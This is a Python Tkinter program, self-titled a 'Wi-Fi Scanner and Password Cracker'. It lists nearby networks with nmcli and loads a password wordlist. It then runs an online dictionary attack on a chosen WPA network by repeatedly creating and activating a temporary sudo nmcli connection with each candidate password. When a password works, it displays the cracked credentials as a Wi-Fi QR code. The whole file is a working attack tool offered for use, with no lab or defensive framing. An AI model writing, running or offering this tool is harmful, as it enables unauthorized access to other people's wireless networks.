import subprocess
import time
import qrcode
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from tkinter import messagebox, Toplevel, Label
from PIL import ImageTk, Image


class WifiScannerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Wi-Fi Scanner and Password Cracker")

        self.networks = []

        self.scan_button = tk.Button(root, text="Scan Wi-Fi Networks", command=self.scan_wifi_networks)
        self.scan_button.pack(pady=10)

        self.table = ttk.Treeview(root, columns=('SSID'), show='headings')
        self.table.heading('SSID', text='SSID')
        self.table.pack(pady=10)

        self.select_button = tk.Button(root, text="Select Network", command=self.select_network)
        self.select_button.pack(pady=10)

        self.selected_network_label = tk.Label(root, text="Selected Network: None")
        self.selected_network_label.pack(pady=10)

        self.load_passwords_button = tk.Button(root, text="Load Passwords File", command=self.load_passwords)
        self.load_passwords_button.pack(pady=10)

        self.run_button = tk.Button(root, text="Run Password Scan", command=self.run_password_scan)
        self.run_button.pack(pady=10)

        self.passwords = []
        self.selected_network = None

    def scan_wifi_networks(self):
        self.table.delete(*self.table.get_children())
        result = subprocess.run(['nmcli', '-f', 'SSID', 'dev', 'wifi'], stdout=subprocess.PIPE)
        self.networks = [network.strip() for network in result.stdout.decode().split('\n') if network.strip()]
        for network in self.networks:
            self.table.insert('', 'end', values=(network,))
        messagebox.showinfo("Scan Complete", "Wi-Fi networks scan complete.")

    def select_network(self):
        selected_item = self.table.selection()
        if selected_item:
            self.selected_network = self.table.item(selected_item, 'values')[0]
            self.selected_network_label.config(text=f"Selected Network: {self.selected_network}")
        else:
            messagebox.showwarning("Selection Error", "Please select a network from the table.")

    def load_passwords(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'r') as file:
                self.passwords = [line.strip() for line in file.readlines()]
            messagebox.showinfo("Passwords Loaded", f"Loaded {len(self.passwords)} passwords.")

    def run_password_scan(self):
        if not self.selected_network:
            messagebox.showwarning("Selection Error", "Please select a network first.")
            return
        if not self.passwords:
            messagebox.showwarning("Password File Error", "Please load a passwords file first.")
            return

        for password in self.passwords:
            self.root.update()
            if self.try_password(self.selected_network, password):
                self.show_qr_code(self.selected_network, password)

                # messagebox.showinfo("Password Found", f"Matched Password: {password}")
                return
            # time.sleep(1)
        messagebox.showinfo("Scan Complete", "No matching password found.")


    def try_password(self, network, password):
        connection_name = "temp_connection"
        print("Trying->", network, ":", password)

        add_connection_cmd = [
            'sudo', 'nmcli', 'connection', 'add', 'type', 'wifi', 'con-name', connection_name,
            'ifname', '*', 'ssid', network, 'wifi-sec.key-mgmt', 'wpa-psk', 'wifi-sec.psk', password
        ]
        add_result = subprocess.run(add_connection_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        if add_result.returncode != 0:

            print(f"Failed to add connection: {add_result.stderr.decode().strip()}")
            subprocess.run(['sudo', 'nmcli', 'connection', 'delete', connection_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return False

        activate_connection_cmd = ['sudo', 'nmcli', 'connection', 'up', connection_name]
        result = subprocess.run(activate_connection_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        success = 'successfully activated' in result.stdout.decode() or 'Connection successfully activated' in result.stderr.decode()

        if not success:
            print(f"Failed to activate connection: {result.stderr.decode().strip()}")


        subprocess.run(['sudo', 'nmcli', 'connection', 'delete', connection_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        return success

    def show_qr_code(self, network, password):
        qr_data = f"WIFI:T:WPA;S:{network};P:{password};;"
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(qr_data)
        qr.make(fit=True)
        
        img = qr.make_image(fill='black', back_color='white')
        
        # Display the QR code in a new window
        top = Toplevel(self.root)
        top.title("Wi-Fi QR Code")
        
        img = ImageTk.PhotoImage(img)
        img_label = Label(top, image=img)
        img_label.image = img 
        img_label.pack()

if __name__ == "__main__":
    root = tk.Tk()
    app = WifiScannerApp(root)
    root.mainloop()
